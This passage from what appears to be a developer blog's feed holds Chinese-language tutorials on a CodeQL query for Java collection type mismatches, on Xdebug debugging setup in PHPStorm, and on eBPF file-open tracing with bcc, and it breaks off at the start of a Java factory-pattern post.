class="line">3</span><br></pre></td><td class="code"><pre><span class="line">predicate haveCommonDescendant(RefType tp1, RefType tp2) &#123;  </span><br><span class="line">    exists(RefType commondesc | commondesc.hasSupertype*(tp1) and commondesc.hasSupertype*(tp2))  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在可以编写出查询的第一个版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">// Insert the class definitions from above</span><br><span class="line"></span><br><span class="line">from JavaUtilCollectionContainsCall juccc, Type collEltType, Type argType</span><br><span class="line">where collEltType = juccc.getCollectionElementType() and argType = juccc.getArgumentType() and</span><br><span class="line">    not haveCommonDescendant(collEltType, argType)</span><br><span class="line">select juccc, &quot;Element type &quot; + collEltType + &quot; is incompatible with argument type &quot; + argType</span><br></pre></td></tr></table></figure><h5 id="改进-1"><a href="#改进-1" class="headerlink" title="改进"></a>改进</h5><p>对于很多程序来说，由于类型变量和通配符，这个查询会产生大量的误报结果：如果集合元素类型是某个类型变量 <code>E</code>，参数类型是<code>String</code>，例如 CodeQL 会认为这两者没有共同子类，我们的查询将标记调用。 排除此类误报结果的一种简单方法是简单地要求<code>collEltType</code>和<code>argType</code>都不是<code>TypeVariable</code>的实例</p><p>误报的另一个来源是原始类型的自动装箱：例如，如果集合的元素类型是<code>Integer</code>并且参数是<code>int</code>类型，则谓词<code>haveCommonDescendant</code>将失败，因为<code>int</code>不是 RefType。 考虑到这一点，我们的查询应该检查<code>collEltType</code>不是<code>argType</code>的装箱类型</p><p>最后<code>null</code>是特殊的，因为它的类型（在 CodeQL 库中称为 <code>&lt;nulltype&gt;</code>）与每个引用类型兼容，因此我们应该将其排除在考虑之外</p><p>加上这三项改进，我们的最终查询是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import java  </span><br><span class="line">  </span><br><span class="line">// Insert the class definitions from above  </span><br><span class="line">  </span><br><span class="line">from JavaUtilCollectionContainsCall juccc, Type collEltType, Type argType  </span><br><span class="line">where collEltType = juccc.getCollectionElementType() and argType = juccc.getArgumentType() and  </span><br><span class="line">    not haveCommonDescendant(collEltType, argType) and  </span><br><span class="line">    not collEltType instanceof TypeVariable and not argType instanceof TypeVariable and  </span><br><span class="line">    not collEltType = argType.(PrimitiveType).getBoxedType() and  </span><br><span class="line">    not argType.hasName(&quot;&lt;nulltype&gt;&quot;)  </span><br><span class="line">select juccc, &quot;Element type &quot; + collEltType + &quot; is incompatible with argument type &quot; + argType</span><br></pre></td></tr></table></figure><h2 id="0x06-Java中容易溢出的比较运算"><a href="#0x06-Java中容易溢出的比较运算" class="headerlink" title="0x06 Java中容易溢出的比较运算"></a>0x06 Java中容易溢出的比较运算</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;codeql 学习记录&lt;/p&gt;</summary>
    
    
    
    <category term="CodeQL" scheme="https://drun1baby.github.io/categories/CodeQL/"/>
    
    <category term="Java" scheme="https://drun1baby.github.io/categories/Java/"/>
    
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
    <category term="CodeQL" scheme="https://drun1baby.github.io/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>PHPStorm 本地 Debug 配置</title>
    <link href="https://drun1baby.github.io/2023/07/19/PHPStorm-%E6%9C%AC%E5%9C%B0-Debug-%E9%85%8D%E7%BD%AE/"/>
    <id>https://drun1baby.github.io/2023/07/19/PHPStorm-%E6%9C%AC%E5%9C%B0-Debug-%E9%85%8D%E7%BD%AE/</id>
    <published>2023-07-19T06:24:11.000Z</published>
    <updated>2023-07-19T09:05:23.368Z</updated>
    
    <content type="html"><![CDATA[<p>其实算是很早就应该记录的内容，一直被我拖着了</p><span id="more"></span><h1 id="PHPStorm-本地-Debug-配置"><a href="#PHPStorm-本地-Debug-配置" class="headerlink" title="PHPStorm 本地 Debug 配置"></a>PHPStorm 本地 Debug 配置</h1><p>文章内容主要摘自 oatmeal 师傅的博客 <a class="link" href="https://oatmeal.vip/tools/phpstudyphpstormxdebug/">https://oatmeal.vip/tools/phpstudyphpstormxdebug/<i class="fas fa-external-link-alt"></i></a></p><h2 id="XDebug-是如何工作的？"><a href="#XDebug-是如何工作的？" class="headerlink" title="XDebug 是如何工作的？"></a>XDebug 是如何工作的？</h2><h3 id="IDE-结合-XDebug-调试原理"><a href="#IDE-结合-XDebug-调试原理" class="headerlink" title="IDE 结合 XDebug 调试原理"></a>IDE 结合 XDebug 调试原理</h3><ul><li>IDE 行为：打开本地端口（XDebug 2.X 默认为 9000，3.X 默认为 9003）进行监听；同时做好路径映射，将本地的项目与远程服务器的项目目录做一一映射。</li><li>浏览器行为：向服务器发起请求，Headers 中带上 <code>Cookie：XDEBUG_SESSION=IDEKEY</code></li><li>服务器行为：检测到 Cookie，挂起PHP解释器，等待进一步请求；同时获取请求的来源地址，发起对对方端口（此端口与监听端口一致）的访问，建立调试连接。</li><li>IDE 行为：发现有调试连接建立，判断 <code>XDEBUG_SESSION</code> 是否为预设的 IDE key，如果是，双方协商，进入调试状态。</li></ul><h3 id="为什么-Debug-这么难？"><a href="#为什么-Debug-这么难？" class="headerlink" title="为什么 Debug 这么难？"></a>为什么 Debug 这么难？</h3><p>习惯了 Pycharm 和 CLion 的直接虫子 Debug，可能对 PHP 为何如此难用 Debug 感到困惑，这里借了Clang 佬的一张图（来自某年 XMAN）：</p><img src="/2023/07/19/PHPStorm-%E6%9C%AC%E5%9C%B0-Debug-%E9%85%8D%E7%BD%AE/clangDebug.png" class><p>可以看到整个流程中存在三方角色：本地的负责调试客户端的 PhpStrom，提交请求触发调试的浏览器（例如 Chrome）以及安装了 XDebug 等待被调试 PHP 服务器 Apache&#x2F;Nginx 等（这部分在 Windows 下使用 PHPStudy 实现）。三者都存在于本机中，于是会使人产生了在本地调试的错觉。其中最大的区别是 php 解析器是被 apache&#x2F;nginx 等中间件调用，phpstorm 需要经过中间件与调试的 php 代码进行通信，本质上是一种远程调试，而 XDebug 就是实现的插件。</p><h2 id="XDebug-下载与配置"><a href="#XDebug-下载与配置" class="headerlink" title="XDebug 下载与配置"></a>XDebug 下载与配置</h2><p>这里 PHPStudy 其实已经带有了 XDebug，所以在 PHPStudy 里面去做</p><img src="/2023/07/19/PHPStorm-%E6%9C%AC%E5%9C%B0-Debug-%E9%85%8D%E7%BD%AE/debug.png" class><p>在 php.ini 里面配置 xdebug 的内容</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Xdebug]</span></span><br><span class="line"><span class="attr">xdebug.idekey</span>=PHPSTORM</span><br><span class="line"><span class="attr">zend_extension</span>=D:/phpstudy_pro/Extensions/php/php7.<span class="number">4.3</span>nts/ext/php_xdebug.dll</span><br><span class="line"><span class="attr">xdebug.collect_params</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">xdebug.collect_return</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">xdebug.auto_trace</span>=<span class="literal">Off</span></span><br><span class="line"><span class="attr">xdebug.trace_output_dir</span>=D:/phpstudy_pro/Extensions/php_log/php7.<span class="number">4.3</span>nts.xdebug.trace</span><br><span class="line"><span class="attr">xdebug.profiler_enable</span>=<span class="literal">Off</span></span><br><span class="line"><span class="attr">xdebug.profiler_output_dir</span>=D:/phpstudy_pro/Extensions/php_log/php7.<span class="number">4.3</span>nts.xdebug.profiler</span><br><span class="line"><span class="attr">xdebug.remote_enable</span>=<span class="literal">On</span></span><br><span class="line"><span class="attr">xdebug.remote_host</span>=localhost</span><br><span class="line"><span class="attr">xdebug.remote_port</span>=<span class="number">9000</span></span><br><span class="line"><span class="attr">xdebug.remote_handler</span>=dbgp</span><br></pre></td></tr></table></figure><p>然后重启服务器，访问 phpinfo，可以看到已经有 Xdebug 了。</p><img src="/2023/07/19/PHPStorm-%E6%9C%AC%E5%9C%B0-Debug-%E9%85%8D%E7%BD%AE/XdebugExists.png" class><h2 id="PHPStorm-开启监听"><a href="#PHPStorm-开启监听" class="headerlink" title="PHPStorm 开启监听"></a>PHPStorm 开启监听</h2><p>PhpStorm 的配置不用做太大的变化，默认也是开启了 Debug 的，匹配一下端口就行了。</p><img src="/2023/07/19/PHPStorm-%E6%9C%AC%E5%9C%B0-Debug-%E9%85%8D%E7%BD%AE/port9000.png" class><p>设置监听的服务器信息</p><p>Debug → DBGp Proxy，这里是设置 IDE key 以及监听 host 和 port 信息的，这里注意和 <code>php.ini</code> 的属性保持一致即可。</p><img src="/2023/07/19/PHPStorm-%E6%9C%AC%E5%9C%B0-Debug-%E9%85%8D%E7%BD%AE/DBGpProxy.png" class><p>再配置 Web Page</p><img src="/2023/07/19/PHPStorm-%E6%9C%AC%E5%9C%B0-Debug-%E9%85%8D%E7%BD%AE/webPage.png" class><p>点击上面那只小虫子，是一个打电话的形式，这就开启了监听。</p><h2 id="配置-xdebug-helper-插件"><a href="#配置-xdebug-helper-插件" class="headerlink" title="配置 xdebug helper 插件"></a>配置 xdebug helper 插件</h2><img src="/2023/07/19/PHPStorm-%E6%9C%AC%E5%9C%B0-Debug-%E9%85%8D%E7%BD%AE/PHPSTORMKey.png" class><p>这样子的话，就可以直接在开启监听的情况下，通过插件来做调试的开启与否。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;其实算是很早就应该记录的内容，一直被我拖着了&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://drun1baby.github.io/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://drun1baby.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>eBPF 的基本使用</title>
    <link href="https://drun1baby.github.io/2023/07/04/eBPF-%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <id>https://drun1baby.github.io/2023/07/04/eBPF-%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</id>
    <published>2023-07-04T02:11:14.000Z</published>
    <updated>2023-08-06T02:26:40.180Z</updated>
    
    <content type="html"><![CDATA[<p>eBPF 的基本使用，eBPF 学习（一）</p><span id="more"></span><h1 id="eBPF-的基础使用"><a href="#eBPF-的基础使用" class="headerlink" title="eBPF 的基础使用"></a>eBPF 的基础使用</h1><h2 id="eBPF-简介：安全和有效地扩展内核"><a href="#eBPF-简介：安全和有效地扩展内核" class="headerlink" title="eBPF 简介：安全和有效地扩展内核"></a>eBPF 简介：安全和有效地扩展内核</h2><p>eBPF 是一项革命性的技术，起源于 Linux 内核，可以在操作系统的内核中运行沙盒程序。它被用来安全和有效地扩展内核的功能，而不需要改变内核的源代码或加载内核模块。eBPF 通过允许在操作系统内运行沙盒程序，应用程序开发人员可以在运行时，可编程地向操作系统动态添加额外的功能。然后，操作系统保证安全和执行效率，就像在即时编译（JIT）编译器和验证引擎的帮助下进行本地编译一样。eBPF 程序在内核版本之间是可移植的，并且可以自动更新，从而避免了工作负载中断和节点重启。</p><p>今天，eBPF 被广泛用于各类场景：在现代数据中心和云原生环境中，可以提供高性能的网络包处理和负载均衡；以非常低的资源开销，做到对多种细粒度指标的可观测性，帮助应用程序开发人员跟踪应用程序，为性能故障排除提供洞察力；保障应用程序和容器运行时的安全执行，等等。可能性是无穷的，而 eBPF 在操作系统内核中所释放的创新才刚刚开始。</p><h2 id="eBPF-的简单使用"><a href="#eBPF-的简单使用" class="headerlink" title="eBPF 的简单使用"></a>eBPF 的简单使用</h2><ul><li>编写一个 helloworld 程序</li></ul><p>安装对应的开发工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># For Ubuntu20.10+sudo apt-get install -y make clang llvm libelf-dev libbpf-dev bpfcc-tools libbpfcc-dev linux-tools-$(uname -r) linux-headers-$(uname -r)</span></span><br></pre></td></tr></table></figure><p>在开发 eBPF 程序之前，我们先来看一下 eBPF 的开发和执行过程。一般来说，这个过程分为以下 5 步：</p><p>第一步，使用 C 语言开发一个 eBPF 程序；</p><p>第二步，借助 LLVM 把 eBPF 程序编译成 BPF 字节码；</p><p>第三步，通过 bpf 系统调用，把 BPF 字节码提交给内核；</p><p>第四步，内核验证并运行 BPF 字节码，并把相应的状态保存到 BPF 映射中；</p><p>第五步，用户程序通过 BPF 映射查询 BPF 字节码的运行状态。</p><img src="/2023/07/04/eBPF-%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/eBPFRoutine.png" class><p>这里我们使用 bcc 来开发 eBPF 程序，如果使用 bcc 来开发 eBPF 程序的话，可以将前面所说的五步简化为三步</p><h3 id="第一步：使用-C-开发一个-eBPF-程序"><a href="#第一步：使用-C-开发一个-eBPF-程序" class="headerlink" title="第一步：使用 C 开发一个 eBPF 程序"></a>第一步：使用 C 开发一个 eBPF 程序</h3><ul><li>新建一个  <code>hello.c</code>  文件，并输入下面的内容：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hello_world</span><span class="params">(<span class="type">void</span> *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">    bpf_trace_printk(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出 Hello，World，由于是在内核中进行运行所以结果输出到内核调试文件 <code>/sys/kernel/debug/tracing/trace_pipe</code></p><h3 id="第二步：使用-Python-和-BCC-库开发一个用户态程序"><a href="#第二步：使用-Python-和-BCC-库开发一个用户态程序" class="headerlink" title="第二步：使用 Python 和 BCC 库开发一个用户态程序"></a>第二步：使用 Python 和 BCC 库开发一个用户态程序</h3><p>接下来，创建一个 hello.py 文件，并输入下面的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># 1) import bcc library</span></span><br><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2) load BPF program</span></span><br><span class="line">b = BPF(src_file=<span class="string">&quot;hello.c&quot;</span>)</span><br><span class="line"><span class="comment"># 3) attach kprobe</span></span><br><span class="line">b.attach_kprobe(event=<span class="string">&quot;do_sys_openat2&quot;</span>, fn_name=<span class="string">&quot;hello_world&quot;</span>)</span><br><span class="line"><span class="comment"># 4) read and print /sys/kernel/debug/tracing/trace_pipe</span></span><br><span class="line">b.trace_print()</span><br></pre></td></tr></table></figure><p>让我们来看看每一处的具体含义：</p><p>第 1) 处导入了 BCC  库的 BPF 模块，以便接下来调用；</p><p>第 2) 处调用 BPF() 加载第一步开发的 BPF 源代码；</p><p>第 3) 处将 BPF 程序挂载到内核探针（简称 kprobe），其中  do_sys_openat2() 是系统调用  openat()  在内核中的实现；</p><p>第 4) 处则是读取内核调试文件 <code>/sys/kernel/debug/tracing/trace_pipe</code> 的内容，并打印到标准输出中。</p><h3 id="第三步：执行-eBPF-程序"><a href="#第三步：执行-eBPF-程序" class="headerlink" title="第三步：执行 eBPF 程序"></a>第三步：执行 eBPF 程序</h3><p>需要以 root 用户权限执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 hello.py</span><br></pre></td></tr></table></figure><p>输出如图</p><img src="/2023/07/04/eBPF-%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/successSout.png" class><p>这就是一个简单的 eBPF 程序了，但是我们可以看到这个 eBPF 程序当中有几个缺点</p><ol><li>既然我们是通过 ebpf 监控系统打开文件的操作，那么正常情况输出结果应该有打开的文件名</li><li>现在读取结果是直接读 <code>/sys/kernel/debug/tracing/trace_pipe</code> 这个内核调试文件的，这就有一个问题，当存在多个 ebpf 程序的时候输出结果都是到这个文件，这样的话就使得输出结果很不清晰，并且这样性能也很差</li></ol><p>针对上述两个问题，需要利用 BPF 映射来结果，通过映射来读取 ebpf 执行的结果并适当进行一些数据处理，因为上述截图中很多输出字段都是我们不需要的</p><h2 id="改进第一个-eBPF-程序"><a href="#改进第一个-eBPF-程序" class="headerlink" title="改进第一个 eBPF 程序"></a>改进第一个 eBPF 程序</h2><p>BPF 程序可以利用 BPF 映射（map）进行数据存储，而用户程序也需要通过 BPF 映射，同运行在内核中的 BPF 程序进行交互。</p><p>所以，为了解决上面提到的第一个问题，即获取被打开文件名的问题，我们就要引入 BPF 映射。</p><p>BCC 定义了一系列的库函数和辅助宏定义。这里使用 <code>BPF_PERF_OUTPUT</code> 来定义一个 Perf 事件类型的 BPF 映射，这里先定义一个数据结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 包含头文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;uapi/linux/openat2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义数据结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> &#123;</span></span><br><span class="line">  u32 pid; <span class="comment">// 进程pid</span></span><br><span class="line">  u64 ts;  <span class="comment">// 时间</span></span><br><span class="line">  <span class="type">char</span> comm[TASK_COMM_LEN]; <span class="comment">// 进程名</span></span><br><span class="line">  <span class="type">char</span> fname[NAME_MAX]; <span class="comment">// 文件名</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义性能事件映射</span></span><br><span class="line">BPF_PERF_OUTPUT(events);</span><br></pre></td></tr></table></figure><p>然后，在 eBPF 程序中，填充这个数据结构，并调用  <code>perf_submit()</code>  把数据提交到刚才定义的 BPF 映射中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义kprobe处理函数</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">hello_world</span><span class="params">(<span class="keyword">struct</span> pt_regs *ctx, <span class="type">int</span> dfd, <span class="type">const</span> <span class="type">char</span> __user * filename, <span class="keyword">struct</span> open_how *how)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> <span class="title">data</span> =</span> &#123; &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取PID和时间</span></span><br><span class="line">  data.pid = bpf_get_current_pid_tgid();</span><br><span class="line">  data.ts = bpf_ktime_get_ns();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取进程名</span></span><br><span class="line">  <span class="keyword">if</span> (bpf_get_current_comm(&amp;data.comm, <span class="keyword">sizeof</span>(data.comm)) == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    bpf_probe_read(&amp;data.fname, <span class="keyword">sizeof</span>(data.fname), (<span class="type">void</span> *)filename);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 提交性能事件</span></span><br><span class="line">  events.perf_submit(ctx, &amp;data, <span class="keyword">sizeof</span>(data));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>合起来就是下面这个文件，该文件最终在内核中进行运行，将采集到的数据输出到映射中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 包含头文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;uapi/linux/openat2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义数据结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> &#123;</span></span><br><span class="line">  u32 pid; <span class="comment">// 进程pid</span></span><br><span class="line">  u64 ts;  <span class="comment">// 时间</span></span><br><span class="line">  <span class="type">char</span> comm[TASK_COMM_LEN]; <span class="comment">// 进程名</span></span><br><span class="line">  <span class="type">char</span> fname[NAME_MAX]; <span class="comment">// 文件名</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义性能事件映射</span></span><br><span class="line">BPF_PERF_OUTPUT(events);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义kprobe处理函数</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">hello_world</span><span class="params">(<span class="keyword">struct</span> pt_regs *ctx, <span class="type">int</span> dfd, <span class="type">const</span> <span class="type">char</span> __user * filename, <span class="keyword">struct</span> open_how *how)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> <span class="title">data</span> =</span> &#123; &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取PID和时间</span></span><br><span class="line">  data.pid = bpf_get_current_pid_tgid();</span><br><span class="line">  data.ts = bpf_ktime_get_ns();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取进程名</span></span><br><span class="line">  <span class="keyword">if</span> (bpf_get_current_comm(&amp;data.comm, <span class="keyword">sizeof</span>(data.comm)) == <span class="number">0</span>) <span class="comment">// 获取进程名并且存储到缓冲区中</span></span><br><span class="line">  &#123; </span><br><span class="line">    bpf_probe_read(&amp;data.fname, <span class="keyword">sizeof</span>(data.fname), (<span class="type">void</span> *)filename); <span class="comment">// 读取进程打开的文件名</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 提交性能事件</span></span><br><span class="line">  events.perf_submit(ctx, &amp;data, <span class="keyword">sizeof</span>(data));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们需要编写一个用户态的调用程序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载bpf代码</span></span><br><span class="line">b = BPF(src_file=<span class="string">&quot;trace-open.c&quot;</span>)</span><br><span class="line">b.attach_kprobe(event=<span class="string">&quot;do_sys_openat2&quot;</span>, fn_name=<span class="string">&quot;hello_world&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 格式化输出</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%-18s %-16s %-6s %-16s&quot;</span> % (<span class="string">&quot;TIME(s)&quot;</span>, <span class="string">&quot;COMM&quot;</span>, <span class="string">&quot;PID&quot;</span>, <span class="string">&quot;FILE&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里是一个回调函数来进行数据处理 </span></span><br><span class="line">start = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_event</span>(<span class="params">cpu, data, size</span>):</span><br><span class="line">    <span class="keyword">global</span> start</span><br><span class="line">    event = b[<span class="string">&quot;events&quot;</span>].event(data)</span><br><span class="line">    <span class="keyword">if</span> start == <span class="number">0</span>:</span><br><span class="line">            start = event.ts</span><br><span class="line">    time_s = (<span class="built_in">float</span>(event.ts - start)) / <span class="number">1000000000</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%-18.9f %-16s %-6d %-16s&quot;</span> % (time_s, event.comm, event.pid, event.fname))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义名为 “events” 的 Perf 事件映射，然后循环调用读取</span></span><br><span class="line">b[<span class="string">&quot;events&quot;</span>].open_perf_buffer(print_event)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        b.perf_buffer_poll()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><img src="/2023/07/04/eBPF-%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/ModifyResult.png" class><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>简单接触一下 eBPF 的使用</p><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><p>极客时间 eBPF 核心技术与实战</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;eBPF 的基本使用，eBPF 学习（一）&lt;/p&gt;</summary>
    
    
    
    <category term="eBPF" scheme="https://drun1baby.github.io/categories/eBPF/"/>
    
    
    <category term="eBPF" scheme="https://drun1baby.github.io/tags/eBPF/"/>
    
  </entry>
  
  <entry>
    <title>Java 设计模式之工厂模式</title>
    <link href="https://drun1baby.github.io/2023/07/04/Java-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/"/>
    <id>https://drun1baby.github.io/2023/07/04/Java-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</id>
    <published>2023-07-04T02:09:36.000Z</published>
    <updated>2023-07-04T02:10:44.077Z</updated>
    
    <content type="html"><![CDATA[<p>Java 设计模式之工厂模式</p><span id="more"></span><h1 id="Java-设计模式之工厂模式"><a href="#Java-设计模式之工厂模式" class="headerlink" title="Java 设计模式之工厂模式"></a>Java 设计模式之工厂模式</h1><h2 id="0x01-需求分析"><a href="#0x01-需求分析" class="headerlink" title="0x01 需求分析"></a>0x01 需求分析</h2><h3 id="看一个具体的需求"><a href="#看一个具体的需求" class="headerlink" title="看一个具体的需求"></a>看一个具体的需求</h3><p>看一个披萨的项目：要便于披萨种类的扩展，要便于维护。</p><ul><li>披萨的种类很多（比如 GreekPizza、CheesePizza 等）；</li><li>披萨的制作有 prepare，bake，cut，box；</li><li>完成披萨店订购功能。</li></ul><h3 id="使用传统的方式完成"><a href="#使用传统的方式完成" class="headerlink" title="使用传统的方式完成"></a>使用传统的方式完成</h3><img src="/2023/07/04/Java-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/TraditionalSolves.png" class><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 